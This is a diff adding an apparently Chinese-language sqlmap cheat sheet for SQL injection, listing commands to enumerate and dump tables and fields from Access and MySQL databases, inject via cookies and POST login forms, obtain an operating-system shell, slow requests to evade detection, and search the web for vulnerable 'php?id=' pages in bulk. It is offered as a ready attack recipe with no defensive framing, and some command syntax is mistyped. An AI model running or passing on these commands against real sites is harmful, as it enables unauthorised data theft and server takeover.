@@ -1,0 +1,90 @@
+在我的自己的服务器上（http://45.63.4.90/）测试过这个脚本可以运行，通过工具成功获取了信息，哈哈
+
+运行方法 使用run.exe就可以咯，然后敲上攻击命令就搞定了，哈哈~
+
+
+
+access注入手法
+
+
+1.输入url
+
+2.url --tables 猜表
+
+3 url--columns -T 表名     暴字段
+
+4.url --dump -T 表名 -C "字段名"  暴内容
+
+
+
+
+
+mysql注入手法
+
+url --current-db当前库
+url --current-user当前用户
+
+url --dbs     获得数据库
+
+url -D 数据库 --tables 获得表
+
+url -D 数据库 -T 表名 --columns 暴字段
+
+url -D 数据库 -T 表名 -C 字段 --dump   暴内容
+
+
+
+
+cookie注入
+
+url --cookie "id=" --table --level 2    暴表
+
+url --cookie "id=" --columns -T 表名 --level 2 获得字段
+
+url --cookie "id=" --dump -T 表名 -C "字段名" --level 2  获得内容
+
+
+
+post登陆框注入
+
+方法一:利用burp Suit抓包，把包内容保存为txt
+sqlmap -r 保存的包文本 -p  参数
+
+方法二:sqlmap -u url --forms
+
+方法三:sqlmap -u url --data "参数=值&参数=值"
+
+
+
+
+写入sehll(权限大时才可以)
+
+sqlmap - u url --os -cmd=命令
+sqlmap - u url --os -shell=命令
+
+
+伪静态注入
+
+在存在注入的地方加上*号
+
+
+延时注入
+
+sqlmap - dbs -u url --delay 后面跟秒
+
+sqlmap --dbs -u url --safe-freq 次数
+
+
+
+
+批理搜索
+
+
+sqlmap -g inurl:php?id=
+
+
+url --privileges查看权限
+
+
+
+
